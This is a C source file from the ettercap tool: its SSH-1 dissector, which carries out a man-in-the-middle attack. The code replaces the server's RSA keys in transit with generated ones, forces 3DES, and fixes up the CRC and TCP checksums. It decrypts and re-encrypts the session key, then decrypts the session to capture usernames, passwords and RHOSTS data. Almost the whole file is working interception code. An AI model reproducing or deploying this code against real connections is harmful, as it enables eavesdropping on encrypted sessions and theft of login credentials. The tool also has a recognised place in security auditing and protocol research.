/*
    ettercap -- dissector SSH -- TCP 22

    Copyright (C) 2001  ALoR <alor@users.sourceforge.net>, NaGA <crwm@freemail.it>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_dissector_ssh.c,v 1.11 2002/02/10 10:07:49 alor Exp $
*/

#include "include/ec_main.h"

#ifdef HAVE_OPENSSL  // don't compile if you don't have OpenSSL

#ifdef CYGWIN
	#include "./missing/include/nameser.h"
#else
	#include <arpa/nameser.h>
#endif
#include <openssl/ssl.h>
#include <openssl/rand.h>
#include <ctype.h>

#include "include/ec_dissector.h"
#include "include/ec_inet_forge.h"
#include "include/ec_inet_structures.h"
#include "include/ec_error.h"
#include "include/ec_decodedata.h"


#define STREAM_DATA 3000


struct peer {
    u_short source_port;
    u_int   source_ip;
    u_short dest_port;
    u_int   dest_ip;
};

typedef struct {
    RSA *myserverkey;
    RSA *myhostkey;
    int server_mod;
    int host_mod;
    struct ssh_my_key *next;
} ssh_my_key;

typedef struct {
    struct peer match;
    RSA *serverkey;
    RSA *hostkey;
    ssh_my_key *ptrkey;
    void *state_source;
    void *state_dest;
    long int s_seq;
    long int d_seq;
    char d_stream[STREAM_DATA+10];
    char s_stream[STREAM_DATA+10];
    struct ssh_state *next;
} ssh_state;

struct des3_state
{
   des_key_schedule        k1, k2, k3;
   des_cblock              iv1, iv2, iv3;
};


ssh_state *ssh_conn=NULL;
ssh_my_key *ssh_conn_key=NULL;

// protos

FUNC_DISSECTOR(Dissector_ssh);
static void put_bn(BIGNUM *bn, u_char **pp);
static void get_bn(BIGNUM *bn, u_char **pp);
static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n);
int Encrypt_state(u_char *pad, int len);
void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key);
void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key);
void des3_decrypt(u_char *src, u_char *dst, int len, void *state);
void *des3_init(u_char *sesskey, int len);
int getfrom_stream(u_char *ibuf, u_char *obuf);
void reconstruct_stream(u_char *ibuf, short bufflen, u_char *obuf);

// --------------------
void *des3_init(u_char *sesskey, int len)
{
   struct des3_state *state;

   state = malloc(sizeof(*state));

   des_set_key((void *)sesskey, state->k1);
   des_set_key((void *)(sesskey + 8), state->k2);

   if (len <= 16)
      des_set_key((void *)sesskey, state->k3);
   else
      des_set_key((void *)(sesskey + 16), state->k3);

   memset(state->iv1, 0, 8);
   memset(state->iv2, 0, 8);
   memset(state->iv3, 0, 8);

   return (state);
}

void des3_decrypt(u_char *src, u_char *dst, int len, void *state)
{
   struct des3_state *dstate;

   dstate = (struct des3_state *)state;
   memcpy(dstate->iv1, dstate->iv2, 8);

   des_ncbc_encrypt(src, dst, len, dstate->k3, &dstate->iv3, DES_DECRYPT);
   des_ncbc_encrypt(dst, dst, len, dstate->k2, &dstate->iv2, DES_ENCRYPT);
   des_ncbc_encrypt(dst, dst, len, dstate->k1, &dstate->iv1, DES_DECRYPT);
}

int Encrypt_state(u_char *pad, int len)
{
    int i;

    for (i=0; i<len; i++)
      if (pad[i]!=0) return 1;

    return 0;
}

static void put_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   i = BN_num_bits(bn);
   PUTSHORT(i, *pp);
   *pp+=BN_bn2bin(bn, *pp);
}

static void get_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   GETSHORT(i, *pp);
   i = ((i + 7) / 8);
   BN_bin2bn(*pp, i, bn);
   *pp += i;
}

static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n)
{
   static u_char sessid[16];
   u_int i, j;
   u_char *p;

   i = BN_num_bytes(hostkey_n);
   j = BN_num_bytes(serverkey_n);

   if ((p = malloc(i + j + 8)) == NULL)
      return (NULL);

   BN_bn2bin(hostkey_n, p);
   BN_bn2bin(serverkey_n, p + i);
   memcpy(p + i + j, cookie, 8);

   MD5(p, i + j + 8, sessid);
   free(p);

   return (sessid);
}

void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_public_encrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}

void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_private_decrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}

void reconstruct_stream(u_char *ibuf, short bufflen, u_char *obuf)
{
   u_short *fromhere;
   short *datalen;

   fromhere = (u_short *)(obuf);
   datalen = (u_short *)(obuf + 2);

   if (*fromhere > 1500)
   {
      *fromhere = 0;
      *datalen = 0;
      return;
   }

   memcpy(obuf + 4 + *fromhere, ibuf, bufflen);
   *fromhere = 0;
   *datalen += bufflen;
}

int getfrom_stream(u_char *ibuf, u_char *obuf)
{
   u_short *fromhere;
   short *datalen;
   u_short ssh_len = 0;
   u_short ssh_mod = 0;

   fromhere = (u_short *)(ibuf);
   datalen = (u_short *)(ibuf+2);

   if (*datalen == 0)
   {
      *fromhere = 0;
      return 0;
   }

   ssh_len = ntohl(ptohl(ibuf + 4 + *fromhere));
   ssh_mod = 8 - (ssh_len % 8);

   *datalen -= (ssh_len+ssh_mod+4);

   if (ssh_len+ssh_mod+4 > MAX_DATA || (u_long)(*datalen + ssh_len+ssh_mod+4) > STREAM_DATA )
   {
      *datalen = 0;
      *fromhere = 0;
      return 0;
   }

   if (*datalen < 0)
   {
      memmove(ibuf + 4 , ibuf + 4 + *fromhere, *datalen + ssh_len+ssh_mod+4); // move the rest
      *fromhere = *datalen + ssh_len+ssh_mod+4;
      *datalen += ssh_len+ssh_mod+4;
      return 0;
   }
   else
   {
      memcpy(obuf, ibuf + 4 + *fromhere, ssh_len+ssh_mod+4);
      if (*datalen == 0)
         *fromhere = 0;
      else
         *fromhere += ssh_len+ssh_mod+4;
      return ssh_len+ssh_mod+4;
   }

   return 0;

}

FUNC_DISSECTOR(Dissector_ssh)
{

   TCP_header *tcp;
   u_char *payload;
   u_long ssh_len, ssh_mod, datalen, to_arrive;
   u_int IPS, IPD;
   u_short PORTS, PORTD;
   static int initialized=0;
   int direction=0;
   DATA_DISSECTOR;

   if (!initialized) { SSL_library_init(); initialized=1; }

   tcp = (TCP_header *) data;

   datalen = data_to_ettercap->datalen;
   IPS = inet_addr(data_to_ettercap->source_ip);
   IPD = inet_addr(data_to_ettercap->dest_ip);
   PORTS = data_to_ettercap->source_port;
   PORTD = data_to_ettercap->dest_port;

   if (datalen==0) return 0;     // skip ack packets

   payload = (u_char *)((u_long)tcp + tcp->doff * 4);
   to_arrive = (u_long)payload+datalen;

   if ( !memcmp(payload,"SSH-2.0",7) )
   {
       sprintf(data_to_ettercap->type, "ssh 2");
       return 0;
   }

   ssh_len = ptohl(payload);
   ssh_len = ntohl(ssh_len);
   ssh_mod = 8 - (ssh_len % 8);

   // Find interesting packets
   //if (ssh_len + 4 + ssh_mod <= datalen)
   {
      u_char ssh_packet_type, *p;
      ssh_packet_type = *(payload+4+ssh_mod);
      // Skip to binary data
      p = payload+4+ssh_mod+1;

//      if ( Encrypt_state(payload+4, ssh_mod) )  // Crypted packets
      {
         ssh_state **index_ssl;
         struct peer pckpeer;

         // Setting peer
         memset(&pckpeer, 0, sizeof(pckpeer));
         pckpeer.source_port= PORTS;
         pckpeer.source_ip  = IPS;
         pckpeer.dest_port  = PORTD;
         pckpeer.dest_ip    = IPD;

         // Find correct session
         index_ssl = &ssh_conn;
         while(*index_ssl != NULL && memcmp(&((*index_ssl)->match),&pckpeer,sizeof(pckpeer)))
         index_ssl = (ssh_state **)&((*index_ssl)->next);

         if ( (*index_ssl) != NULL )
            direction=1;
         else
         {
           // Setting peer
           memset(&pckpeer,0,sizeof(pckpeer));
           pckpeer.source_port= PORTD;
           pckpeer.source_ip  = IPD;
           pckpeer.dest_port  = PORTS;
           pckpeer.dest_ip    = IPS;

           // Find correct session
           index_ssl = &ssh_conn;
           while(*index_ssl != NULL && memcmp(&((*index_ssl)->match),&pckpeer,sizeof(pckpeer)))
               index_ssl = (ssh_state **)&((*index_ssl)->next);

           if ( (*index_ssl) != NULL )
              direction=2;
         }

         if (!direction && Encrypt_state(payload+4, ssh_mod)) return 0; // Skip Crypted messages whith no session

         // Continue for no 0padding in session key for damnPutty
         if(direction && (*index_ssl)->state_source && (*index_ssl)->state_dest)
         {
           char pacchetto[MAX_DATA];
           char packet[MAX_DATA];
           u_char *stream;
           short slen=0;

           ssh_packet_type = 0;

           if (!Conn_Mode)
           {
              sniff_data_to_ettercap->datasize = 0;
              memset(sniff_data_to_ettercap->data, 0, MAX_DATA);
           }

           if (datalen>MAX_DATA) return 0; // Is it possible?

           // Simple workaround for duplicated packets
           if (direction==1)
           {
              if( (*index_ssl)->s_seq && (*index_ssl)->s_seq == tcp->seq ) return 0;
              (*index_ssl)->s_seq = tcp->seq;
              reconstruct_stream(payload, datalen, (*index_ssl)->s_stream);
              stream = (*index_ssl)->s_stream;
           }
           else
           {
              if( (*index_ssl)->d_seq && (*index_ssl)->d_seq == tcp->seq ) return 0;
              (*index_ssl)->d_seq = tcp->seq;
              reconstruct_stream(payload, datalen, (*index_ssl)->d_stream);
              stream = (*index_ssl)->d_stream;
           }

           while ( (slen = getfrom_stream(stream, packet) ) > 0)
           {

              ssh_len = ptohl(packet);
              ssh_len = ntohl(ssh_len);
              ssh_mod = 8 - (ssh_len % 8);

              memset(pacchetto, 0, MAX_DATA);

              if (direction==1)
                 des3_decrypt(packet+4, (u_char *)pacchetto, ssh_len+ssh_mod, (*index_ssl)->state_source);
              else
                 des3_decrypt(packet+4, (u_char *)pacchetto, ssh_len+ssh_mod, (*index_ssl)->state_dest);

              //if (Conn_Mode)
              {
                 int len;
                 len = ptohl(pacchetto+ssh_mod+1);
                 len = htonl(len);

                 sprintf(data_to_ettercap->type, "SSH decrypt");

                 if (pacchetto[ssh_mod]==4) // SSH_CMSG_USER
                 {
                    #ifdef DEBUG
                       Debug_msg("\tDissector_ssh USER");
                    #endif
                    memcpy(data_to_ettercap->user, &pacchetto[ssh_mod+5], (len>24) ? 24 : len);
                    strlcat(data_to_ettercap->user, "\n", sizeof(data_to_ettercap->user));
                 }

                 if (pacchetto[ssh_mod]==9) // SSH_AUTH_PASSWORD
                 {
                    #ifdef DEBUG
                       Debug_msg("\tDissector_ssh PASS");
                    #endif
                    memcpy(data_to_ettercap->pass, &pacchetto[ssh_mod+5], (len>24) ? 24 : len);
                    strlcat(data_to_ettercap->pass, "\n", sizeof(data_to_ettercap->pass));
                 }

                 if (pacchetto[ssh_mod]==5)
                 {
                    #ifdef DEBUG
                       Debug_msg("\tDissector_ssh RHOSTS");
                    #endif
                    sprintf(data_to_ettercap->pass,"RHOSTS:");
                    memcpy(data_to_ettercap->pass, &pacchetto[ssh_mod+5], (len>17) ? 17 : len);
                    strlcat(data_to_ettercap->pass, "\n", sizeof(data_to_ettercap->pass));
                 }

                 if (pacchetto[ssh_mod]==6)
                 {
                    #ifdef DEBUG
                       Debug_msg("\tDissector_ssh RSA");
                    #endif
                    sprintf(data_to_ettercap->pass,"RSA AUTH\n");
                 }
              }
              if (!Conn_Mode)
              {
                 if ((pacchetto[ssh_mod]>=16 && pacchetto[ssh_mod]<=18) ||
                      pacchetto[ssh_mod] == 4 || pacchetto[ssh_mod] == 9)
                 {   // print readable packets

                    int len;
                    len = ptohl(pacchetto+ssh_mod+1);
                    len = htonl(len);
                    sniff_data_to_ettercap->datasize+=len;
                    if (sniff_data_to_ettercap->datasize < MAX_DATA)
                    {
                       pacchetto[ssh_mod+5+len]=0;
                       strlcat(sniff_data_to_ettercap->data, &pacchetto[ssh_mod+5], sizeof(sniff_data_to_ettercap->data));
                    }
                 }
              }


           }  // end while

           return 0;
         }
      }
      //else  // Plain text packets
      if (ssh_packet_type==2 /*&& (Conn_Mode || Options.normal)*/) //PUBLIC_KEY
      {
         ssh_state **index_ssl;
         ssh_my_key **index_ssl2;

         struct peer pckpeer;
         int server_mod, host_mod;
         u_char *q;
         // Setting peer
         memset(&pckpeer,0,sizeof(pckpeer));
         pckpeer.source_port= PORTS;
         pckpeer.source_ip  = IPS;
         pckpeer.dest_port  = PORTD;
         pckpeer.dest_ip    = IPD;

         // Find correct session
            index_ssl = &ssh_conn;
            index_ssl2 = &ssh_conn_key;

         while(*index_ssl != NULL && memcmp(&((*index_ssl)->match),&pckpeer,sizeof(pckpeer)))
           index_ssl = (ssh_state **)&((*index_ssl)->next);

         p+=8; q=p;
         if (*index_ssl == NULL)
         {
           *index_ssl = (ssh_state *)calloc(1, sizeof(ssh_state));
           memcpy(&((*index_ssl)->match), &pckpeer, sizeof(pckpeer));

           (*index_ssl)->state_source=NULL;
           (*index_ssl)->state_dest=NULL;

           (*index_ssl)->serverkey = RSA_new();
           (*index_ssl)->serverkey->n = BN_new();
           (*index_ssl)->serverkey->e = BN_new();

           (*index_ssl)->hostkey = RSA_new();
           (*index_ssl)->hostkey->n = BN_new();
           (*index_ssl)->hostkey->e = BN_new();
           (*index_ssl)->s_seq=0;
           (*index_ssl)->d_seq=0;
           (*index_ssl)->next = NULL;

           //  Get the RSA Key
           GETLONG(server_mod,p);
           get_bn((*index_ssl)->serverkey->e, &p);
           get_bn((*index_ssl)->serverkey->n, &p);

           GETLONG(host_mod,p);
           get_bn((*index_ssl)->hostkey->e, &p);
           get_bn((*index_ssl)->hostkey->n, &p);


           while(*index_ssl2 != NULL && ( (*index_ssl2)->server_mod!=server_mod || (*index_ssl2)->host_mod!=host_mod))
               index_ssl2 = (ssh_my_key **)&((*index_ssl2)->next);

           if (*index_ssl2==NULL)
           {
              *index_ssl2 = (ssh_my_key *)calloc(1,sizeof(ssh_my_key));

              // Generate the new key
              (*index_ssl2)->myserverkey=(RSA *)RSA_generate_key(server_mod, 35, NULL, NULL);
              (*index_ssl2)->myhostkey=(RSA *)RSA_generate_key(host_mod, 35, NULL, NULL);
              (*index_ssl2)->server_mod=server_mod;
              (*index_ssl2)->host_mod=host_mod;
              (*index_ssl2)->next = NULL;

           }

           (*index_ssl)->ptrkey=*index_ssl2;
         }

         *index_ssl2=(*index_ssl)->ptrkey;

         // Put the new key
         q+=4;
         put_bn((*index_ssl2)->myserverkey->e, &q);
         put_bn((*index_ssl2)->myserverkey->n, &q);
         q+=4;
         put_bn((*index_ssl2)->myhostkey->e, &q);
         put_bn((*index_ssl2)->myhostkey->n, &q);

         // Set the mask to 3DES
         *(u_long *)(payload+datalen-12) = htonl(8);
         // recalculate SSH crc
         *(u_long *)(payload+datalen-4) = htonl(Inet_Forge_CRC(payload+4, datalen-8));
         // recalculate TCP checksum
         tcp->checksum = 0;
         tcp->checksum = Inet_Forge_Checksum((unsigned short *)tcp, IPPROTO_TCP, datalen+(tcp->doff * 4), IPS, IPD);

         if (!Conn_Mode)
         {
           sniff_data_to_ettercap->datasize=0;
             memset(sniff_data_to_ettercap->data, 0, MAX_DATA);
         }

      }
      //else
      if (ssh_packet_type==3 /*&& (Conn_Mode || Options.normal)*/) // SESSION_KEY
      {
         u_char cookie[8];
         u_char sesskey[32];
         u_char *temp_session_id, *q;
         u_char session_id1[16], session_id2[16];
         BIGNUM *enckey,*bn;
         int i;

         ssh_state **index_ssl;
         ssh_my_key *index_ssl2;
         struct peer pckpeer;

         memset(&pckpeer,0,sizeof(pckpeer));
         pckpeer.source_port= PORTD;
         pckpeer.source_ip  = IPD;
         pckpeer.dest_port  = PORTS;
         pckpeer.dest_ip    = IPS;

         // Find correct session
         index_ssl = &ssh_conn;
         while(*index_ssl != NULL && memcmp(&((*index_ssl)->match),&pckpeer,sizeof(pckpeer)))
           index_ssl = (ssh_state **)&((*index_ssl)->next);

         if (*index_ssl==NULL) return 0;
         if (!(*index_ssl)->serverkey || !(*index_ssl)->hostkey)
           return 0;
         index_ssl2=(*index_ssl)->ptrkey;

         p++; // Cypher type;
         // Get the cookie
         memcpy(cookie, p, 8);
         p+=8; q=p;

         // Calculate real session id and fake session id
         temp_session_id=ssh_session_id(cookie, (*index_ssl)->hostkey->n,(*index_ssl)->serverkey->n);
         memcpy(session_id1, temp_session_id, 16);
         temp_session_id=ssh_session_id(cookie, (index_ssl2)->myhostkey->n,(index_ssl2)->myserverkey->n);
         memcpy(session_id2, temp_session_id, 16);

         // Get the session key
         enckey = BN_new();
         get_bn(enckey, &p);

         // Decrypt session key
         if (BN_cmp((index_ssl2)->myserverkey->n, (index_ssl2)->myhostkey->n) > 0)
         {
           rsa_private_decrypt(enckey, enckey, (index_ssl2)->myserverkey);
           rsa_private_decrypt(enckey, enckey, (index_ssl2)->myhostkey);
         }
         else
         {
           rsa_private_decrypt(enckey, enckey, (index_ssl2)->myhostkey);
           rsa_private_decrypt(enckey, enckey, (index_ssl2)->myserverkey);
         }

         BN_mask_bits(enckey, sizeof(sesskey) * 8);
         i = BN_num_bytes(enckey);
         memset(sesskey, 0, sizeof(sesskey));
         BN_bn2bin(enckey, sesskey + sizeof(sesskey) - i);
         BN_clear_free(enckey);

         for (i = 0; i < 16; i++)
           sesskey[i] ^= session_id2[i];

         // SAVE SESSION_KEY
         (*index_ssl)->state_source=des3_init(sesskey, sizeof(sesskey));
         (*index_ssl)->state_dest  =des3_init(sesskey, sizeof(sesskey));

         // ReCrypt Session Key
         bn = BN_new();
         BN_set_word(bn, 0);

         for (i = 0; i < sizeof(sesskey); i++)
         {
           BN_lshift(bn, bn, 8);
           if (i < 16) BN_add_word(bn, sesskey[i] ^ session_id1[i]);
           else BN_add_word(bn, sesskey[i]);
         }

         if (BN_cmp((*index_ssl)->serverkey->n, (*index_ssl)->hostkey->n) < 0)
         {
           rsa_public_encrypt(bn, bn, (*index_ssl)->serverkey);
           rsa_public_encrypt(bn, bn, (*index_ssl)->hostkey);
         }
         else
         {
           rsa_public_encrypt(bn, bn, (*index_ssl)->hostkey);
           rsa_public_encrypt(bn, bn, (*index_ssl)->serverkey);
         }

            // Clear the session
         RSA_free((*index_ssl)->serverkey);
         RSA_free((*index_ssl)->hostkey);
         (*index_ssl)->serverkey=NULL;
         (*index_ssl)->hostkey=NULL;          // Put right Session Key in the packet
         put_bn(bn, &q);
         BN_clear_free(bn);

         // recalculate SSH crc
         *(u_long *)(payload+datalen-4) = htonl(Inet_Forge_CRC(payload+4, datalen-8));
         // recalculate TCP checksum
         tcp->checksum = 0;
         tcp->checksum = Inet_Forge_Checksum((unsigned short *)tcp, IPPROTO_TCP, datalen+(tcp->doff * 4), IPS, IPD);
         sprintf(data_to_ettercap->type,"SSH decrypt");

         if (!Conn_Mode)
         {
             sniff_data_to_ettercap->datasize=0;
             memset(sniff_data_to_ettercap->data, 0, MAX_DATA);
         }
      }
   }

   return 0;
}

#endif   // HAVE_OPENSSL

/* EOF */

